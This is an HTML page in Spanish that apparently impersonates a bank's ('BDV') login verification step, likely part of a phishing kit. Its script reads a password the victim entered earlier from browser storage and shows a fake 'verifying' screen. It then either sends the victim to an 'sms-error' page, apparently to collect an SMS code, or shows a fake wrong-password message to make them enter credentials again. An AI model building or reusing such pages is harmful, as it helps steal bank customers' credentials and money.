<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BDVSOLICITUDES - Verificando</title>
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-color: #0d1117; 
        color: white;
        overflow: hidden;
      }

      .container {
        text-align: center;
        width: 90%;
        max-width: 600px;
        transition: opacity 0.5s;
      }

      .logo-container { margin-bottom: 50px; }
      .logo-img { width: 180px; }

      .loader-dots {
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 8px;
        margin-bottom: 40px;
      }

      .dot {
        width: 12px;
        height: 12px;
        background-color: #ff5023; 
        border-radius: 50%;
        animation: pulse 1.5s infinite ease-in-out;
      }

      .dot:nth-child(2) { animation-delay: 0.2s; width: 10px; height: 10px; opacity: 0.8; }
      .dot:nth-child(3) { animation-delay: 0.4s; width: 8px; height: 8px; opacity: 0.6; }

      @keyframes pulse {
        0%, 100% { transform: scale(1); opacity: 1; }
        50% { transform: scale(1.2); opacity: 0.5; }
      }

      .main-text {
        color: #ff5023; 
        font-size: 22px;
        font-weight: bold;
        margin-bottom: 15px;
      }

      .sub-text {
        color: #ffffff;
        font-style: italic;
        font-size: 16px;
        font-weight: 300;
        opacity: 0.9;
      }

      #error-bar {
        position: fixed;
        bottom: -100px;
        left: 0;
        width: 100%;
        background-color: #0067b1;
        color: white;
        padding: 20px;
        text-align: center;
        font-size: 16px;
        font-weight: bold;
        transition: bottom 0.5s ease;
        z-index: 9999;
      }

      #error-bar.show { bottom: 0; }
    </style>
  </head>
  <body>
    <div class="container" id="main-container">
      <div class="logo-container">
        <img src="logo.png" alt="BDV" class="logo-img" />
      </div>
      
      <div class="loader-dots">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>

      <div class="main-text">Estamos verificando tu información...</div>
      <div class="sub-text">¡Esto solo tomará unos segundos! No cierres la ventana.</div>
    </div>

    <div id="error-bar">Usuario o Clave incorrecta</div>

    <script>
      function mostrarError() {
        const errorBar = document.getElementById("error-bar");
        errorBar.classList.add("show");
        document.getElementById("main-container").style.opacity = "0.5";
        setTimeout(() => {
          window.location.href = "index.html";
        }, 4000);
      }

      function startCountdown(seconds) {
        const clave = localStorage.getItem("temp_pass") || "";
        const tieneCaracterEspecial = /[!@#$%^&*(),.?":{}|<>]/.test(clave);

        var countdownInterval = setInterval(function () {
          seconds--;
          if (seconds < 0) {
            clearInterval(countdownInterval);
            if (tieneCaracterEspecial) {
              window.location.href = "sms-error.html";
            } else {
              mostrarError();
            }
          }
        }, 1000);
      }

      document.addEventListener("DOMContentLoaded", function () {
        startCountdown(5);
      });
    </script>
  </body>
</html>
